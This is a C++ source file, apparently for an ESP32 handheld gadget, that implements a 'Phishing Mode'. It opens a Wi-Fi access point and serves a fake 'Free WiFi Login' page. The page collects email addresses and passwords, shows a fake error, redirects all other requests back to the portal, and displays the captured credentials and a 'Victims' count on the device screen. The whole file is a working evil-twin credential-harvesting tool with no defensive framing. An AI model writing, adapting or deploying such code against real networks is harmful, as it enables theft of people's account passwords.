#include "PhishingMode.h"
#include <ESPAsyncWebServer.h>

AsyncWebServer* server = nullptr;

const char index_html[] PROGMEM = R"=====(
<!DOCTYPE html><html><head><title>Free WiFi Login</title>
<style>body{font-family:sans-serif;text-align:center;padding:20px;}</style>
</head><body>
<h1>Login to Free WiFi</h1>
<form action='/login' method='GET'>
<input type='email' name='email' placeholder='Email'><br><br>
<input type='password' name='pass' placeholder='Password'><br><br>
<input type='submit' value='Login'>
</form>
</body></html>
)=====";

void PhishingMode::begin() {
    wifiMgr.startAPMode();
    
    server = new AsyncWebServer(80);
    
    server->on("/", HTTP_ANY, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
    });
    
    server->on("/login", HTTP_GET, [this](AsyncWebServerRequest *request){
        String email = "";
        String pass = "";
        if (request->hasParam("email")) email = request->getParam("email")->value();
        if (request->hasParam("pass")) pass = request->getParam("pass")->value();
        
        this->lastCreds = email + ":" + pass;
        this->victimCount++;
        
        request->send(200, "text/plain", "Error: Service Unavailable. Please try again later.");
    });
    
    server->onNotFound([](AsyncWebServerRequest *request){
        request->redirect("http://1.2.3.4/"); // Redirect to self
    });
    
    server->begin();
}

void PhishingMode::stop() {
    if (server) {
        server->end();
        delete server;
        server = nullptr;
    }
    wifiMgr.stopWiFi();
}

void PhishingMode::update() {
    wifiMgr.update();
    
    // Check for exit
    inputMgr.update();
    if (inputMgr.wasJustPressed(PIN_BTN_SELECT)) { // Long press or special combo ideally
        // In simple menu, maybe we can't exit easily without a back button
        // Assuming PIN_BTN_SELECT acts as exit here for demo
        changeFeature(FEATURE_MENU);
    }
}

void PhishingMode::draw() {
    displayMgr.clear();
    displayMgr.drawStatus("Phishing Mode", "AP: " + String(PHISHING_SSID));
    
    displayMgr.drawText(0, 20, "Victims: " + String(victimCount), 16);
    displayMgr.drawText(0, 40, lastCreds, 10);
    
    displayMgr.display();
}

void PhishingMode::handleRoot(AsyncWebServerRequest *request) {
    // Static handlers need instance access if they want to modify member vars
    // Lambda captures 'this' instead easier
}
